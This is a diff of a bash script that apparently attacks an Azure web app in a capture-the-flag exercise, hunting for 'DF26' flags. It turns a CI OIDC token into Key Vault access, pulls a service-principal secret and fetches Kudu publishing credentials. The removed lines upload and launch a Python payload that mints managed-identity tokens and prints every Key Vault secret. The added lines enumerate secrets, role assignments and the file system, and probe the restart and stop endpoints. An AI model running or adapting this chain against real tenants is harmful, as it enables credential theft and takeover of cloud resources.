@@ -4,78 +4,57 @@ M="--max-time 30 --connect-timeout 10"
 SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
 RAPP="/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
 SCM="https://app-tbl-reporting-prod.scm.azurewebsites.net"
+MGMT="https://management.azure.com"
 API=2022-03-01
-TAG="kxz$(date +%s | tail -c 5)"
-PY="${TAG}_x.py"
-RES="${TAG}_res.txt"
 
 OIDC=$(curl -sS $M -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
 KV=$(curl -sS $M -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
+echo "KV_TOKEN_len=${#KV}"
+
+echo "===== kv-tbl-prod secret names ====="
+curl -sS $M -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4&maxresults=25" | jq -r '.value[]?.id' 2>/dev/null
+echo "(if empty, list denied)"
+
 J=$(curl -sS $M -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" | jq -r '.value')
 RS=$(curl -sS $M -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$(echo "$J"|jq -r .appId)" -d "client_secret=$(echo "$J"|jq -r .clientSecret)" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
-PUB=$(curl -sS $M -X POST -H "Authorization: Bearer $RS" -H "Content-Length: 0" "https://management.azure.com$RAPP/config/publishingcredentials/list?api-version=$API")
+echo "RS_TOKEN_len=${#RS}  appId=$(echo "$J"|jq -r .appId)"
+
+echo "===== GET config/web (startup + status) ====="
+curl -sS $M -H "Authorization: Bearer $RS" "$MGMT$RAPP/config/web?api-version=$API" -w "\nHTTP=%{http_code}\n" -o /tmp/web.json
+echo "appCommandLine: $(jq -r '.properties.appCommandLine // "(none)"' /tmp/web.json 2>/dev/null)"
+echo "linuxFxVersion: $(jq -r '.properties.linuxFxVersion // "?"' /tmp/web.json 2>/dev/null)"
+
+echo "===== GET site (kind/identity) ====="
+curl -sS $M -H "Authorization: Bearer $RS" "$MGMT$RAPP?api-version=$API" | jq '{kind:.kind, state:.properties.state, identity:.identity}' 2>/dev/null
+
+echo "===== role assignments the SP can read on the site (may 403) ====="
+curl -sS $M -H "Authorization: Bearer $RS" "$MGMT$RAPP/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" -w "\nHTTP=%{http_code}\n" | head -c 800; echo
+
+# Kudu creds
+PUB=$(curl -sS $M -X POST -H "Authorization: Bearer $RS" -H "Content-Length: 0" "$MGMT$RAPP/config/publishingcredentials/list?api-version=$API")
 U=$(echo "$PUB"|jq -r '.properties.publishingUserName'); P=$(echo "$PUB"|jq -r '.properties.publishingPassword')
-echo "TAG=$TAG  scm_user=$U passlen=${#P}"
+echo "scm_user=$U passlen=${#P}"
+A="-u $U:$P"
 
-cat > /tmp/ex.py <<'PY'
-import os, json, time, urllib.request, urllib.parse
-UAMI="7a85156a-01c4-4e61-8472-40a92107159b"
-OUT="/home/site/wwwroot/__RES__"
-def log(s):
-    try: open(OUT,"a").write(str(s)+"\n")
-    except Exception: pass
-def tok(resource):
-    ie=os.environ.get("IDENTITY_ENDPOINT",""); ih=os.environ.get("IDENTITY_HEADER","")
-    log("IE=%r IH_len=%d MSI_EP=%r" % (ie, len(ih), os.environ.get("MSI_ENDPOINT","")))
-    if ie and ih:
-        u=ie+("&" if "?" in ie else "?")+urllib.parse.urlencode({"resource":resource,"api-version":"2019-08-01","client_id":UAMI})
-        r=urllib.request.Request(u, headers={"X-IDENTITY-HEADER":ih})
-        return json.loads(urllib.request.urlopen(r,timeout=25).read())["access_token"]
-    u="http://169.254.169.254/metadata/identity/oauth2/token?"+urllib.parse.urlencode({"resource":resource,"api-version":"2018-02-01","client_id":UAMI})
-    r=urllib.request.Request(u, headers={"Metadata":"true"})
-    return json.loads(urllib.request.urlopen(r,timeout=25).read())["access_token"]
-def run():
-    try: open(OUT,"w").write("start %f pid=%d\n"%(time.time(),os.getpid()))
-    except Exception: pass
-    try:
-        t=tok("https://vault.azure.net")
-        log("GOT_VAULT_TOKEN len=%d"%len(t))
-        V="https://kv-tbl-sec-x3euoz.vault.azure.net"
-        L=json.loads(urllib.request.urlopen(urllib.request.Request(V+"/secrets?api-version=7.4",headers={"Authorization":"Bearer "+t}),timeout=25).read())
-        log("SEC_IDS="+json.dumps([s["id"] for s in L.get("value",[])]))
-        for s in L.get("value",[]):
-            sid=s["id"]
-            v=json.loads(urllib.request.urlopen(urllib.request.Request(sid+"?api-version=7.4",headers={"Authorization":"Bearer "+t}),timeout=25).read()).get("value")
-            log("VAL %s = %s"%(sid,v))
-    except Exception as e:
-        log("ERR_VAULT %r"%e)
-    # also dump identity-related env for diagnostics
-    for k,v in os.environ.items():
-        if any(x in k.upper() for x in ("IDENTITY","MSI","WEBSITE_AUTH","FLAG","DF26","DOJO")):
-            log("ENV %s=%s"%(k,v))
-run()
-import http.server, socketserver
-try:
-    socketserver.TCPServer(("0.0.0.0",int(os.environ.get("PORT","8000"))),http.server.BaseHTTPRequestHandler).serve_forever()
-except Exception:
-    time.sleep(900)
-PY
-sed -i "s#__RES__#$RES#g" /tmp/ex.py
+echo "===== Kudu env (does SCM container see IDENTITY_ENDPOINT?) ====="
+curl -sS $M $A "$SCM/api/environment" 2>/dev/null | jq -r 'to_entries[]? | select((.key|ascii_upcase) as $k | ($k|test("IDENTITY|MSI|UAMI|CLIENT_ID|WEBSITE_AUTH"))) | "\(.key)=\(.value)"' 2>/dev/null | head -40
+echo "(empty = not exposed to kudu)"
 
-echo "PUT exploit:"; curl -sS $M -u "$U:$P" -X PUT --data-binary @/tmp/ex.py -H "If-Match: *" -o /dev/null -w "  %{http_code}\n" "$SCM/api/vfs/site/wwwroot/$PY"
-echo "PATCH startup:"; curl -sS $M -X PATCH -H "Authorization: Bearer $RS" -H "Content-Type: application/json" -d "{\"properties\":{\"appCommandLine\":\"python $PY\"}}" -o /dev/null -w "  %{http_code}\n" "https://management.azure.com$RAPP/config/web?api-version=$API"
-echo "RESTART:"; curl -sS $M -X POST -H "Authorization: Bearer $RS" -H "Content-Length: 0" -o /dev/null -w "  %{http_code}\n" "https://management.azure.com$RAPP/restart?api-version=$API"
+echo "===== wwwroot listing (top) ====="
+curl -sS $M $A "$SCM/api/vfs/site/wwwroot/" 2>/dev/null | jq -r '.[]? | "\(.mime)\t\(.name)"' 2>/dev/null | head -60
 
-echo "waiting for worker to mint token..."
-for i in $(seq 1 14); do
-  sleep 14
-  R=$(curl -sS $M -u "$U:$P" "$SCM/api/vfs/site/wwwroot/$RES" 2>/dev/null)
-  if echo "$R" | grep -qiE 'GOT_VAULT_TOKEN|SEC_IDS|ERR_VAULT|IE='; then
-    echo "===== $RES (try $i) ====="; echo "$R"
-    echo "$R" | grep -oE "DF26[{][^}]*[}]" | sort -u && break
-  fi
-done
-echo "========== FINAL =========="
-curl -sS $M -u "$U:$P" "$SCM/api/vfs/site/wwwroot/$RES"
-echo; echo "== DF26 =="; curl -sS $M -u "$U:$P" "$SCM/api/vfs/site/wwwroot/$RES" | grep -oE "DF26[{][^}]*[}]" | sort -u
-echo DONE; exit 0
+echo "===== search for antenv / site-packages path ====="
+curl -sS $M $A "$SCM/api/vfs/site/wwwroot/antenv/lib/" 2>/dev/null | jq -r '.[]?.name' 2>/dev/null
+echo "--- /home/site deployments? ---"
+curl -sS $M $A "$SCM/api/vfs/site/" 2>/dev/null | jq -r '.[]?.name' 2>/dev/null
+
+echo "===== probe restart primitives (status codes only; no deploy) ====="
+echo -n "MGMT restart: "; curl -sS $M -o /dev/null -w "%{http_code}\n" -X POST -H "Authorization: Bearer $RS" -H "Content-Length: 0" "$MGMT$RAPP/restart?api-version=$API"
+echo -n "MGMT stop: "; curl -sS $M -o /dev/null -w "%{http_code}\n" -X POST -H "Authorization: Bearer $RS" -H "Content-Length: 0" "$MGMT$RAPP/stop?api-version=$API" 2>/dev/null || true
+echo -n "Kudu GET /api/scm/info: "; curl -sS $M -o /dev/null -w "%{http_code}\n" $A "$SCM/api/scm/info"
+echo -n "Kudu GET /api/settings: "; curl -sS $M -o /dev/null -w "%{http_code}\n" $A "$SCM/api/settings"
+echo "SCM_DO_BUILD setting:"; curl -sS $M $A "$SCM/api/settings" 2>/dev/null | jq '{build:.SCM_DO_BUILD_DURING_DEPLOYMENT, startup:.}' 2>/dev/null | head -c 400; echo
+
+echo "===== any existing result/flag files in wwwroot ====="
+curl -sS $M $A "$SCM/api/vfs/site/wwwroot/" 2>/dev/null | jq -r '.[]? | select(.name|test("res|flag|loot|DF26|kxz";"i")) | .name' 2>/dev/null
+echo "RECON DONE"; exit 0
